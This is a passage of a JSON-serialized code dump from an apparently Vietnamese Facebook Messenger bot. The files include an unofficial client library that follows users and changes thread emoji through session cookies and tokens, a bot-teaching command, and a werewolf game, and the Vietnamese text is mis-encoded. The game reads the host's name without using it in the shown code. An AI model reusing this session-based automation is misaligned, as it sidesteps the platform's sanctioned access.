\"followUser\"\n                    };\n                } catch (error) {\n                    reject(error);\n                }\n            });\n        },\n\n        ajax: async function(userID) {\n            const form = {\n                user_id: userID,\n                location: 1,\n                feed_story: true,\n                fb_api_caller_class: \"RelayModern\",\n                fb_api_req_friendly_name: \"follow\"\n            };\n\n            return defaultFuncs\n                .post('https://www.facebook.com/ajax/follow/follow_profile.php', ctx.jar, form)\n                .then(utils.parseAndCheckLogin(ctx, defaultFuncs));\n        },\n\n        url: async function(userID) {\n            const form = {\n                profile_id: userID,\n                location: 'profile',\n                feed_story: true,\n                __a: 1,\n                fb_dtsg: ctx.fb_dtsg,\n                jazoest: ctx.jazoest\n            };\n\n            return defaultFuncs\n                .post(`https://www.facebook.com/profile/follow_profile/?id=${userID}`, ctx.jar, form)\n                .then(utils.parseAndCheckLogin(ctx, defaultFuncs));\n        }\n    };\n\n    return function followUser(userID, callback) {\n        let resolveFunc = function() {};\n        let rejectFunc = function() {};\n        const returnPromise = new Promise((resolve, reject) => {\n            resolveFunc = resolve;\n            rejectFunc = reject;\n        });\n\n        if (!callback) {\n            callback = function(err, data) {\n                if (err) return rejectFunc(err);\n                resolveFunc(data);\n            };\n        }\n\n        // Validate input\n        if (!userID || isNaN(userID)) {\n            const error = new Error(\"Invalid userID. Must be numeric string or number\");\n            log.error(\"followUser\", error);\n            callback(error);\n            return returnPromise;\n        }\n\n        // Danh s√°ch c√°c ph∆∞∆°ng th·ª©c theo th·ª© t·ª± ∆∞u ti√™n\n        const methodOrder = ['graphql', 'mqtt', 'ajax', 'url'];\n        let currentMethodIndex = 0;\n\n        const tryNextMethod = async () => {\n            if (currentMethodIndex >= methodOrder.length) {\n                const error = new Error(\"All follow methods failed\");\n                log.error(\"followUser\", error);\n                return callback(error);\n            }\n\n            const currentMethod = methodOrder[currentMethodIndex];\n            log.info(\"followUser\", `Trying method: ${currentMethod}`);\n\n            try {\n                const result = await methods[currentMethod](userID);\n                \n                if (result && !result.error) {\n                    log.info(\"followUser\", `Successfully followed user ${userID} using ${currentMethod} method`);\n                    return callback(null, {\n                        success: true,\n                        userID: userID,\n                        method: currentMethod,\n                        timestamp: Date.now()\n                    });\n                } else {\n                    throw new Error(result.error || \"Unknown error\");\n                }\n            } catch (error) {\n                log.error(\"followUser\", `${currentMethod} method failed:`, error);\n                currentMethodIndex++;\n                return tryNextMethod();\n            }\n        };\n\n        // B·∫Øt ƒë·∫ßu v·ªõi ph∆∞∆°ng th·ª©c ƒë·∫ßu ti√™n\n        tryNextMethod();\n        return returnPromise;\n    };\n};","path":null,"size_bytes":6289,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/changeThreadEmoji.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function changeThreadEmoji(emoji, threadID, callback) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err) {\n        if (err) return rejectFunc(err);\n        resolveFunc();\n      };\n    }\n    var form = {\n      emoji_choice: emoji,\n      thread_or_other_fbid: threadID\n    };\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/messaging/save_thread_emoji/?source=thread_settings&__pc=EXP1%3Amessengerdotcom_pkg\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (resData.error === 1357031) throw { error: \"Trying to change emoji of a chat that doesn't exist. Have at least one message in the thread before trying to change the emoji.\" };\n        if (resData.error) throw resData;\n\n        return callback();\n      })\n      .catch(function (err) {\n        log.error(\"changeThreadEmoji\", err);\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":1288,"size_tokens":null},"modules/commands/daybot.js":{"content":"const { simi } = require('./../../lib/sim.js'); // Thay ƒë∆∞·ªùng d·∫´n t·ªõi m√£ m·ªõi c·ªßa b·∫°n\n\nmodule.exports.config = {\n    name: \"daybot\",\n    version: \"1.0.0\",\n    hasPermssion: 0,\n    credits: \"gojo\",\n    description: \"D·∫°y bot\",\n    commandCategory: \"Nh√≥m\",\n    usages: \"\",\n    cooldowns: 2,\n    dependencies: {\n        \"axios\": \"\"\n    }\n};\n\nconst forbiddenKeywords = [\n    \"ƒë·ªãt\",\"ngu\",\"ng√°o\",\"√≥c ch√≥\",\"dit\",\"l·ªìn\",\"bu·ªìi\",\"c·∫∑c\",\"http\"\n];\n\nmodule.exports.run = ({ api, event, args }) => {\n    const { threadID, messageID, senderID } = event;\n    return api.sendMessage(\"[ BOT ] - Reply tin nh·∫Øn n√†y nh·∫≠p t·ª´ mu·ªën d·∫°y bot tr·∫£ l·ªùi\", threadID, (err, info) => {\n        global.client.handleReply.push({\n            step: 1,\n            name: this.config.name,\n            messageID: info.messageID,\n            content: {\n                id: senderID,\n                ask: \"\",\n                ans: \"\"\n            }\n        });\n    }, messageID);\n};\n\nmodule.exports.handleReply = async({ api, event, Users, handleReply }) => {\n    const moment = require(\"moment-timezone\");\n    var timeZ = moment.tz(\"Asia/Ho_Chi_Minh\").format(\"HH:mm:ss | DD/MM/YYYY\");\n    const { threadID, messageID, senderID, body } = event;\n    let by_name = (await Users.getData(senderID)).name;\n\n    if (handleReply.content.id != senderID) return;\n\n    const input = body.trim();\n\n    const containsForbiddenKeywords = (text) => {\n        return forbiddenKeywords.some(keyword => text.toLowerCase().includes(keyword.toLowerCase()));\n    };\n\n    const sendC = (msg, step, content) => api.sendMessage(msg, threadID, (err, info) => {\n        global.client.handleReply.splice(global.client.handleReply.indexOf(handleReply), 1);\n        api.unsendMessage(handleReply.messageID);\n        global.client.handleReply.push({\n            step: step,\n            name: this.config.name,\n            messageID: info.messageID,\n            content: content\n        });\n    }, messageID);\n\n    const send = async(msg) => api.sendMessage(msg, threadID, messageID);\n\n    let content = handleReply.content;\n\n    switch (handleReply.step) {\n        case 1:\n            if (containsForbiddenKeywords(input)) {\n                return send(\"[ BOT ] - C√¢u h·ªèi c·ªßa b·∫°n ch·ª©a t·ª´ kh√≥a b·ªã c·∫•m. Vui l√≤ng th·ª≠ l·∫°i v·ªõi n·ªôi dung kh√°c.\");\n            }\n\n            content.ask = input;\n            sendC(\"[ BOT ] - Reply tin nh·∫Øn n√†y ƒë·ªÉ nh·∫≠p c√¢u tr·∫£ l·ªùi cho t·ª´ v·ª´a xong\", 2, content);\n            break;\n\n        case 2:\n            if (containsForbiddenKeywords(input)) {\n                return send(\"[ BOT ] - C√¢u tr·∫£ l·ªùi c·ªßa b·∫°n ch·ª©a t·ª´ kh√≥a b·ªã c·∫•m. Vui l√≤ng th·ª≠ l·∫°i v·ªõi n·ªôi dung kh√°c.\");\n            }\n\n            content.ans = input;\n            global.client.handleReply.splice(global.client.handleReply.indexOf(handleReply), 1);\n            api.unsendMessage(handleReply.messageID);\n\n            let c = content;\n            let response = simi('teach', { ask: c.ask, ans: c.ans });\n            if (response.error) {\n                return send(`${response.error}`);\n            }\n\n            send(`[ BOT ] - D·∫°y Bot th√†nh c√¥ng, previews:\\n\\nü§§ Data:\\nüßë‚ÄçüéìKhi b·∫°n g·ªçi bot v√† nh·∫Øn bot: \" ${c.ask} \" \\nüìåBot s·∫Ω tr·∫£ l·ªùi: \" ${c.ans} \"\\n\\n‚è± Time: ${timeZ}`);\n            break;\n\n        default:\n            break;\n    }\n};\n","path":null,"size_bytes":3401,"size_tokens":null},"lib/fca-auto/src/postFormData.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function postFormData(url, form, callback) {\n    var resolveFunc = function () {};\n    var rejectFunc = function () {};\n\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (\n      !callback &&\n      (utils.getType(form) == \"Function\" ||\n        utils.getType(form) == \"AsyncFunction\")\n    ) {\n      callback = form;\n      form = {};\n    }\n\n    form = form || {};\n\n    callback =\n      callback ||\n      function (err, data) {\n        if (err) return rejectFunc(err);\n        resolveFunc(data);\n      };\n\n    defaultFuncs\n      .postFormData(url, ctx.jar, form, {})\n      .then(function (resData) {\n        callback(null, resData.body.toString());\n      })\n      .catch(function (err) {\n        log.error(\"postFormData\", err);\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};","path":null,"size_bytes":1026,"size_tokens":null},"modules/commands/masoi.js":{"content":"\nvar axios = require(\"axios\");  const { join, basename,resolve  } = require(\"path\");var os = require('os');var request = require(\"request\");const { unlinkSync,readdirSync, readFileSync, writeFileSync, existsSync, copySync, createWriteStream, createReadStream } = require(\"fs-extra\");\nmodule.exports.config = {\n  name: \"masoi\",\n  version: \"1.0.0\",\n  hasPermssion: 0,\n  credits: \"Horizon\",\n  description: \"Ma S√≥i\",\n  commandCategory: \"Tr√≤ Ch∆°i\",\n  usages: \"masoi\",\n  cooldowns: 1\n};\nvar userName;\n  if (process.env.REPL_OWNER != undefined) userName = process.env.REPL_OWNER;\n  else if (os.hostname() != null || os.hostname() != undefined) userName = os.hostname();\n  else userName = os.userInfo().username;\n  \nmodule.exports.onLoad = async function () {\n  if (!existsSync(__dirname + '/cache/masoi/werewolf.json')) {\n    var { data } = await axios.get('https://raw.githubusercontent.com/J-JRT/api2/mainV2/masoi.json', { method: 'GET' });\n    writeFileSync(__dirname + '/cache/masoi/werewolf.json', JSON.stringify(data,null,2), 'utf8');\n  }\n  if (!existsSync(__dirname + '/cache/masoi/DanLang.png')) {\n    request('https://thuthuatchoi.com/media/photos/shares/Boardgame/masoi/Ma_soi_Ultimate/villager.png').pipe(createWriteStream(__dirname + '/cache/masoi/DanLang.png'));\n  }\n  if (!existsSync(__dirname + '/cache/masoi/TienTri.png')) {\n    request('https://thuthuatchoi.com/media/photos/shares/Boardgame/masoi/Ma_soi_Ultimate/seer.png').pipe(createWriteStream(__dirname + '/cache/masoi/TienTri.png'));\n  }\n  if (!existsSync(__dirname + '/cache/masoi/BaoVe.png')) {\n    request('https://thuthuatchoi.com/media/photos/shares/Boardgame/masoi/Ma_soi_Ultimate/bodyguard.png').pipe(createWriteStream(__dirname + '/cache/masoi/BaoVe.png'));\n  }\n  if (!existsSync(__dirname + '/cache/masoi/ThoSan.png')) {\n    request('https://thuthuatchoi.com/media/photos/shares/Boardgame/masoi/Ma_soi_Ultimate/hunter.png').pipe(createWriteStream(__dirname + '/cache/masoi/ThoSan.png'));\n  }\n  if (!existsSync(__dirname + '/cache/masoi/PhuThuy.png')) {\n    request('https://thuthuatchoi.com/media/photos/shares/Boardgame/masoi/Ma_soi_Ultimate/witch.png').pipe(createWriteStream(__dirname + '/cache/masoi/PhuThuy.png'));\n  }\n  if (!existsSync(__dirname + '/cache/masoi/Cupid.png')) {\n    request('https://thuthuatchoi.com/media/photos/shares/Boardgame/masoi/Ma_soi_Ultimate/cupid.png').pipe(createWriteStream(__dirname + '/cache/masoi/Cupid.png'));\n  }\n  if (!existsSync(__dirname + '/cache/masoi/GiaLang.png')) {\n    request('https://thuthuatchoi.com/media/photos/shares/Boardgame/masoi/la-bai-gia-lang.jpg').pipe(createWriteStream(__dirname + '/cache/masoi/GiaLang.png'));\n  }\n  if (!existsSync(__dirname + '/cache/masoi/CoBe.png')) {\n    request('https://thuthuatchoi.com/media/photos/shares/Boardgame/masoi/la-bai-ban-soi.jpg').pipe(createWriteStream(__dirname + '/cache/masoi/CoBe.png'));\n  }\n  if (!existsSync(__dirname + '/cache/masoi/CanhSatTruong.png')) {\n    request('https://thuthuatchoi.com/media/photos/shares/Boardgame/masoi/Ma_soi_Ultimate/mayor.png').pipe(createWriteStream(__dirname + '/cache/masoi/CanhSatTruong.png'));\n  }\n  if (!existsSync(__dirname + '/cache/masoi/SoiThuong.png')) {\n    request('https://thuthuatchoi.com/media/photos/shares/Boardgame/masoi/Ma_soi_Ultimate/werewolf.png').pipe(createWriteStream(__dirname + '/cache/masoi/SoiThuong.png'));\n  }\n  if (!existsSync(__dirname + '/cache/masoi/SoiCon.png')) {\n    request('https://thuthuatchoi.com/media/photos/shares/Boardgame/masoi/Ma_soi_Ultimate/wolf-cub.png').pipe(createWriteStream(__dirname + '/cache/masoi/SoiCon.png'));\n  }\n}\n\nvar Global_ArrayChoose = {\n  MaSoi: new Object(),\n  BaoVe: new Array(),\n  TienTri: new Object(),\n  DanLang: new Object(),\n}\nvar DataGM = {\n  Die: '',\n  NeedNumber: ''\n}\nvar Block_Action = false;\nvar Block_Vote = false;\nvar Days = 0;\n\nmodule.exports.handleReply = async function({ api,event,handleReply, Users }) {\n  var values = global.moduleData.werewolf.get(global.AuthThread);\n  var SoiT = values.player.filter(i => i.phe == \"Ma S√≥i\");\n  if (Block_Action) return api.sendMessage(\"‚ûú Qu√° Tr·ªÖ R·ªìi üôâ\", event.threadID);\n  if (handleReply.author && event.senderID != handleReply.author) return;\n    else switch (parseInt(values.type)) {\n      case 9: {\n        switch (handleReply.type) {\n          case \"SoiChoose\": {\n            if (isNaN(event.body)) return api.sendMessage(\"‚ûú Sai R·ªìi, H√£y Nh·∫≠p M·ªôt Con S·ªë !\", event.threadID);\n            if (event.body > handleReply.Listuser.length) return api.sendMessage(\"‚ûú Sai R·ªìi, H√£y Nh·∫≠p M·ªôt Con S·ªë !\", event.threadID);\n            var Choose = handleReply.Listuser[event.body - 1].id;\n            let NanNhan = (await api.getUserInfoV5(Choose))[0].o0.data.messaging_actors[0].name || await Users.getNameUser(Choose);\n            let name = (await api.getUserInfoV5(event.senderID))[0].o0.data.messaging_actors[0].name || await Users.getNameUser(event.senderID);\n            var Find = SoiT.find(i => i.id == handleReply.author);\n            if (Find.vote == 0 || Find.vote == '') {\n              Global_ArrayChoose.MaSoi[Choose] == undefined ? Global_ArrayChoose.MaSoi[Choose] = 1 : Global_ArrayChoose.MaSoi[Choose]++;\n            }\n            else {\n              Global_ArrayChoose.MaSoi[Find.vote] == undefined ? Global_ArrayChoose.MaSoi[Find.vote] = 0 : Global_ArrayChoose.MaSoi[Find.vote] - 1;\n              if (Global_ArrayChoose.MaSoi[Find.vote] == 0) {\n                delete Global_ArrayChoose.MaSoi[Find.vote];\n              }\n              Global_ArrayChoose.MaSoi[Choose] == undefined ? Global_ArrayChoose.MaSoi[Choose] = 1 : Global_ArrayChoose.MaSoi[Choose]++;\n            }\n            Find.vote = Choose;\n            let Values = global.moduleData.werewolf.get(global.AuthThread);\n            for (let i of handleReply.TeamSoi) {\n              api.sendMessage('‚ûú Ma S√≥i: ' + name + ' V·ª´a Vote ' + NanNhan + '\\x0aT·ªïng Vote: ' + Global_ArrayChoose['MaSoi'][Choose] + '/' + Values['player']['filter'](_0x32101b => _0x32101b['phe'] == 'Ma S√≥i')['length'], i);\n            }\n            api.sendMessage('‚ûú B·∫°n ƒê√£ Vote: ' + NanNhan + '\\x0aT·ªïng Vote: ' + Global_ArrayChoose['MaSoi'][Choose] + '/' + Values['player']['filter'](_0x402a9e => _0x402a9e['phe'] == 'Ma S√≥i')['length'] + '\\x0aB·∫°n C√≥ Th·ªÉ Thay ƒê·ªïi ƒê·ªëi T∆∞·ª£ng', handleReply.author);\n          }\n          break;\n          case \"Another_Role_Async\": {\n            switch (handleReply.role) {\n              case \"Ti√™n Tri\": {\n                if (isNaN(event.body)) return api.sendMessage(\"‚ûú Sai R·ªìi, H√£y Nh·∫≠p M·ªôt Con S·ªë !\", event.threadID);\n                if (event.body > handleReply.Listuser.length) return api.sendMessage(\"‚ûú Sai R·ªìi, H√£y Nh·∫≠p M·ªôt Con S·ªë !\", event.threadID);\n                var Choose = handleReply.Listuser[event.body - 1];\n                let NanNhan = (await api.getUserInfoV5(Choose.id))[0].o0.data.messaging_actors[0].name || await Users.getNameUser(Choose.id);\n                Global_ArrayChoose.TienTri.Choose = Choose;\n                Global_ArrayChoose.TienTri.Owner = event.senderID;\n                return api.sendMessage('‚ûú B·∫°n ƒê√£ Ch·ªçn Ti√™n Tri: ' + NanNhan + ' Trong ƒê√™m Nay, B·∫°n C√≥ Th·ªÉ Ch·ªçn L·∫°i !', event.threadID);\n              }\n              case \"B·∫£o V·ªá\": {\n                if (isNaN(event.body)) return api.sendMessage(\"‚ûú Sai R·ªìi, H√£y Nh·∫≠p M·ªôt Con S·ªë !\", event.threadID);\n                if (event.body > handleReply.Listuser.length) return api.sendMessage(\"‚ûú Sai R·ªìi, H√£y Nh·∫≠p M·ªôt Con S·ªë !\", event.threadID);\n                var Choose = handleReply.Listuser[event.body - 1];\n                let NanNhan = (await api.getUserInfoV5(Choose.id))[0].o0.data.messaging_actors[0].name || await Users.getNameUser(Choose.id);\n                Global_ArrayChoose.BaoVe[0] = Choose.id;\n                return api.sendMessage('‚ûú B·∫°n ƒë√£ ch·ªçn b·∫£o v·ªá ' + NanNhan + ', ng∆∞·ªùi ch∆°i n√†y s·∫Ω b·∫•t t·ª≠ trong ƒë√™m nay üíÄ, b·∫°n c√≥ th·ªÉ ch·ªçn l·∫°i !', event.threadID);\n            }\n          }\n        } \n        case \"VillageVoting\": {\n          if (Block_Vote) return api.sendMessage(\"‚ûú Qu√° Tr·ªÖ R·ªìi üôâ\", event.threadID);\n          if (isNaN(event.body)) return api.sendMessage(\"‚ûú Sai R·ªìi, H√£y Nh·∫≠p M·ªôt Con S·ªë !\", event.threadID);\n          if (event.body > handleReply.Listuser.length) return api.sendMessage(\"‚ûú Sai R·ªìi, H√£y Nh·∫≠p M·ªôt Con S·ªë !\", event.threadID);\n          if (!handleReply.Listuser.some(i => i.id == event.senderID)) return api.sendMessage(\"‚ûú B·∫°n Kh√¥ng C√≥ Quy·ªÅn Vote !\", event.threadID);\n          var Choose = handleReply.Listuser[event.body - 1];\n          Global_ArrayChoose.DanLang[Choose.id] == undefined ? Global_ArrayChoose.DanLang[Choose.id] = 1 : Global_ArrayChoose.DanLang[Choose.id]++;\n          var Find = handleReply.Listuser.find(i => i.id == event.senderID);\n          if (Find.vote == 0 || Find.vote == '') {\n            Global_ArrayChoose.DanLang[Choose.id] == undefined ? Global_ArrayChoose.DanLang[Choose.id] = 1 : Global_ArrayChoose.DanLang[Choose.id]++;\n          }\n          else {\n            Global_ArrayChoose.DanLang[Find.vote] == undefined ? Global_ArrayChoose.DanLang[Find.vote] = 0 : Global_ArrayChoose.DanLang[Find.vote] - 1;\n              if (Global_ArrayChoose.DanLang[Find.vote] == 0) {\n                delete Global_ArrayChoose.DanLang[Find.vote];\n              }\n            Global_ArrayChoose.MaSoi[Choose] == undefined ? Global_ArrayChoose.DanLang[Choose] = 1 : Global_ArrayChoose.DanLang[Choose]++;\n          }\n          Find.vote = Choose;\n          var name = (await api.getUserInfoV5(Choose.id))[0].o0.data.messaging_actors[0].name || await Users.getNameUser(Choose.id);\n          api.sendMessage('‚ûú Vote: ' + name + '(' + event['body'] + ') Th√†nh C√¥ng ! \\x0aT·ªïng Vote: ' + Global_ArrayChoose['DanLang'][Choose['id']] + '/' + (handleReply['Listuser']['length'] - SoiT['length'] - 0x1), event.threadID);\n        }\n        break;\n      }\n    }\n  }\n}\n\nmodule.exports.MaSoiChoose = async function(api, event, Users,Data, TeamSoi) {\n  var values = Data.get(event.threadID)\n  var sus = values.player.filter(i => i.phe == 'Ma S√≥i')\n  for (let i of sus) {\n    var values = Data.get(event.threadID)\n    var playerfilter = values.player.filter(i => i.phe != 'Ma S√≥i')\n    var Player = [];\n    var Objection = \"\";\n    var stt = 1;\n    api.sendMessage(\"‚ûú Ph·∫£n H·ªìi V√† Ch·ªçn 1 trong (tin nh·∫Øn ch·ª©a) c√°c t√™n ƒë∆∞·ª£c li·ªát k√™ d∆∞·ªõi ƒë√¢y, ch√∫ √Ω : b·∫£n c·∫ßn ch·ªçn ƒë√∫ng v√† ch·ªâ ƒëc ch·ªçn 1 l·∫ßn\",i.id);\n    for (let ii of playerfilter) { \n      var name = (await api.getUserInfoV5(ii.id))[0].o0.data.messaging_actors[0].name || await Users.getNameUser(ii);\n      Player.push({ id: ii.id, name: name, stt: stt, role: ii.vai });\n      Objection += 'ƒê·ªëi T∆∞·ª£ng S·ªë: ' + stt + '\\x0aT√™n: ' + name + '\\x0aUID: ' + ii['id'] + '\\x0aFacebook: Facebook.com/' + ii['id'] + '\\x0a\\x0a';\n      if (ii == playerfilter[playerfilter.length - 1]) {\n        api.sendMessage(Objection,i.id, (err,info) => global.client.handleReply.push({\n          type: \"SoiChoose\",\n          name: this.config.name,\n          author: i.id,\n          messageID: info.messageID,\n          Listuser: Player,\n          TeamSoi\n        }));\n        api.sendMessage('B·∫°n C√≥ 30 Gi√¢y ƒê·ªÉ L·ª±a Ch·ªçn ƒê·ªÉ Vote Kill 1 Ng∆∞·ªùi !',i.id)\n      }\n      stt++;\n    }\n  }\n  \n}\n\nmodule.exports.Another_Role_Async = async function(api, event, Users,Data) {\n  var values = Data.get(event.threadID)\n  var playerfilter = values.player;\n    for (let i of playerfilter) {\n      switch (i.vai) {\n        case \"D√¢n L√†ng\": {\n          api.sendMessage('‚ûú Kh√¥ng C√≥ Vi·ªác G√¨ L√†m, ƒêi Ng·ªß Th√¥i üêß',i.id);\n        }\n        break;\n        case \"Ti√™n Tri\": {\n          let Player = [];\n          let Objection = \"\";\n          let stt = 1;\n          for (let i of playerfilter) {\n            var name = (await api.getUserInfoV5(i.id))[0].o0.data.messaging_actors[0].name || await Users.getNameUser(i.id);\n            Player.push({ id: i.id, name: name, stt: stt, role: i.vai });\n            Objection += 'ƒê·ªëi T∆∞·ª£ng S·ªë: ' + stt + '\\x0aT√™n: ' + name + '\\x0aUID: ' + i['id'] + '\\x0aFacebook: Facebook.com/' + i['id'] + '\\x0a\\x0a';\n            stt++;\n          }\n          api.sendMessage('‚ûú H√£y Ch·ªçn 1 Trong Nh·ªØng ƒê·ªëi T∆∞·ª£ng D∆∞·ªõi ƒê√¢y ƒê·ªÉ Xem C√≥ Ph·∫£i L√† S√≥i Hay Kh√¥ng !', i.id);\n        api.sendMessage(Objection,i.id, (err,info) => global.client.handleReply.push({\n            type: \"Another_Role_Async\",\n            name: this.config.name,\n            author: i.id,\n            messageID: info.messageID,\n            Listuser: Player,\n            role: i.vai,\n        }));\n      }\n      break;\n      case \"B·∫£o V·ªá\": {\n        let Player = [];\n        let Objection = \"\";\n        let stt = 1;\n        for (let i of playerfilter) {\n          var name = (await api.getUserInfoV5(i.id))[0].o0.data.messaging_actors[0].name || await Users.getNameUser(i.id);\n          Player.push({ id: i.id, name: name, stt: stt, role: i.vai });\n          Objection += 'ƒê·ªëi T∆∞·ª£ng S·ªë: ' + stt + '\\x0aT√™n: ' + name + '\\x0aUID: ' + i['id'] + '\\x0aFacebook: Facebook.com/' + i['id'] + '\\x0a\\x0a';\n          stt++\n        }\n        api.sendMessage('‚ûú H√£y Ch·ªçn 1 Trong Nh·ªØng ƒê·ªëi T∆∞·ª£ng D∆∞·ªõi ƒê√¢y ƒê·ªÉ B·∫£o V·ªá !', i.id);\n        api.sendMessage(Objection,i.id, (err,info) => global.client.handleReply.push({\n          type: \"Another_Role_Async\",\n          name: this.config.name,\n          author: i.id,\n          messageID: info.messageID,\n          Listuser: Player,\n          role: \"B·∫£o V·ªá\"\n        }));\n      }\n      break;\n    }\n  }\n}\n\nmodule.exports.VillageVoting = async function(api, event, Users,Data,TeamSoi) {\n  api.sendMessage('‚ûú ƒê√£ H·∫øt Th·ªùi Gian Th·∫£o Lu·∫≠n !, V√† B√¢y Gi·ªù C√°c B·∫°n C√≥ 1 Ph√∫t ƒê·ªÉ Vote Treo C·ªï !', event.threadID);\n  await new Promise(resolve => setTimeout(resolve, 1000));\n  Block_Action = false;\n  var values = Data.get(event.threadID)\n  var playerfilter = values.player;\n  var Player = [];\n  var Objection = \"\";\n  var stt = 1;\n  for (let i of playerfilter) {\n    var name = (await api.getUserInfoV5(i.id))[0].o0.data.messaging_actors[0].name || await Users.getNameUser(i.id);\n    Player.push({ id: i.id, name: name, stt: stt, role: i.vai });\n    Objection += 'ƒê·ªëi T∆∞·ª£ng S·ªë: ' + stt + '\\x0aT√™n: ' + name + '\\x0aUID: ' + i['id'] + '\\x0aFacebook: Facebook.com/' + i['id'] + '\\x0a\\x0a';\n    stt++;\n  }\n  api.sendMessage('‚ûú H√£y Ch·ªçn 1 Trong Nh·ªØng ƒê·ªëi T∆∞·ª£ng D∆∞·ªõi ƒê√¢y ƒê·ªÉ Vote Treo C·ªï !', event.threadID);\n  api.sendMessage(Objection,event.threadID, (err,info) => global.client.handleReply.push({\n    type: \"VillageVoting\",\n    name: this.config.name,\n    messageID: info.messageID,\n    Listuser: Player,\n    TeamSoi\n  }));\n}\n\nmodule.exports.VillageLogic_Sort = async function(api, event, Users,Data,TeamSoi) {\n  Block_Vote = true;\n  var values = Data.get(event.threadID)\n  var playerfilter = values.player;\n  var list = [];\n  api.sendMessage('‚ûú ƒê√£ H·∫øt Th·ªùi Gian,ƒêang T√≠nh To√°n C√°c Thu·∫≠t To√°n ...', event.threadID);\n  await new Promise(resolve => setTimeout(resolve, 1000));\n  for (let i of Object.keys(Global_ArrayChoose.DanLang)) {\n    var NeedNumber = playerfilter.length - playerfilter.filter(i => i.phe == \"Ma S√≥i\").length - 1;\n    var NumberU = Global_ArrayChoose.DanLang[i];\n    if (NumberU >= NeedNumber) {\n      list.push(i); \n    }\n  }\n  if (list.length < 1) {\n    api.sendMessage('‚ûú Kh√¥ng C√≥ Ai Treo B·ªã Treo C·ªï Trong Ng√†y H√¥m Nay !', event.threadID);\n    return;\n  }\n  else if (list.length == 1) {\n    var index = list[0];\n    var Find = playerfilter.find(i => i.id == index);\n    var name = (await api.getUserInfoV5(Find.id))[0].o0.data.messaging_actors[0].name || await Users.getNameUser(Find.id);\n    api.sendMessage('‚ûú Ng∆∞·ªùi B·ªã Treo C·ªï: ' + name + '\\x0aCh·ª©c NƒÉng: ' + Find['vai'], event.threadID);\n    playerfilter.splice(playerfilter.findIndex(i => i.id == index),1);\n    if (Find.vai == \"Ma S√≥i\") {\n      TeamSoi.splice(TeamSoi.findIndex(i => i.id == index), 1);\n      return;\n    }\n  }\n  else {\n    return api.sendMessage('‚ûú D√¢n L√†ng ƒê√£ Kh√¥ng Ch·ªçn ƒê∆∞·ª£c Ai ƒê·ªÉ Treo C·ªï !', event.threadID);  \n  }\n}\n\nmodule.exports.Morning_Time = async function(api, event, Users,Data,TeamSoi) {\n  Days += 1;\n  var values = Data.get(event.threadID)\n  var All = values.player;\n  try {\n    let Values = Data.get(global.AuthThread);\n    var WereWolf = Values.player.filter(i => i.phe == \"Ma S√≥i\");\n    var Villager = Values.player.filter(i => i.phe == \"D√¢n\");\n    if (Villager.length <= WereWolf.length) {\n      return await module.exports.EndGame(api,event,Data,\"Werewolf\");\n    } \n    else {\n      api.sendMessage(\"‚ûú M√†n ƒë√™m k·∫øt th√∫c, v√† ƒë√¢y l√† th√¥ng tin c·ªßa ng√†y h√¥m nay !\",event.threadID);\n      api.sendMessage('Ng√†y Th·ª©: ' + Days + '\\x0aC√≤n S·ªëng: ' + All['length'] + '\\x0aNg∆∞·ªùi Ch·∫øt: ' + (DataGM['Die'] ? DataGM['Die'] : 'Kh√¥ng C√≥ Ai') + '\\x0aT·ªïng S√≥i: ' + Data['get'](event['threadID'])['player']['filter'](_0xb674f8 => _0xb674f8['phe'] == 'Ma S√≥i')['length'] + '\\x0aT·ªïng D√¢n: ' + Data['get'](event['threadID'])['player']['filter'](_0x97b918 => _0x97b918['phe'] == 'D√¢n')['length'],event.threadID);\n      await new Promise(resolve => setTimeout(resolve, 3000));\n      api.sendMessage('‚ûú C√°c B·∫°n C√≥ 1 Ph√∫t ƒê·ªÉ Th·∫£o Lu·∫≠n Treo C·ªï Ai !',event.threadID);\n      await new Promise(resolve => setTimeout(resolve, 60 * 1000));\n      await module.exports.VillageVoting(api, event, Users,Data,TeamSoi);\n      await new Promise(resolve => setTimeout(resolve, 60 * 1000));\n      await module.exports.VillageLogic_Sort(api, event, Users,Data,TeamSoi);\n      await new Promise(resolve => setTimeout(resolve, 1000));\n      await module.exports.ResetData(api, event, Users,Data,TeamSoi);\n    }\n  }\n  catch (e) {\n    console.log(e);\n  }  \n}\n\nmodule.exports.Check_Win_Loop = async function(api, event, Users,Data,TeamSoi) {\n  var Values = Data.get(event.threadID);\n  var VillageFilter = Values.player.filter(i => i.phe != \"Ma S√≥i\");\n  var WolfFilter = Values.player.filter(i => i.phe == \"Ma S√≥i\");\n  if (WolfFilter.length == 0) {\n    return await module.exports.EndGame(api, event, Data,\"Village\");\n  }\n  else if (parseInt(VillageFilter.length) <= parseInt(WolfFilter.length) || parseInt(VillageFilter.length) == 0) {\n    return await module.exports.EndGame(api, event, Data,\"Werewolf\");\n  }\n  else {\n    return await start(api, event, Users,Data,TeamSoi);\n  }\n}\n\nmodule.exports.ResetData = async function(api, event, Users,Data,TeamSoi) {\n  global.client.handleReply = [];\n  DataGM = new Object({\n    Die: '',\n    NeedNumber: ''\n  });\n  Block_Action = false;\n  Block_Vote = false;\n  \n  for (let i of Object.keys(Global_ArrayChoose)) {\n    if (i == 'BaoVe')\n      Global_ArrayChoose[i] = [];\n    else \n      Global_ArrayChoose[i] = {};\n  }\n  return await module.exports.Check_Win_Loop(api, event, Users,Data,TeamSoi);\n}\n\nmodule.exports.EndGame = async function(api, event,Data,winner) {\n  switch (winner) {\n    case \"Village\": {\n      api.sendMessage('‚ûú Ch√∫c M·ª´ng D√¢n L√†ng ƒê√£ Ti√™u Di·ªát ƒê∆∞·ª£c T·∫•t C·∫£ S√≥i ! V√† Ph·∫ßn Th·∫Øng 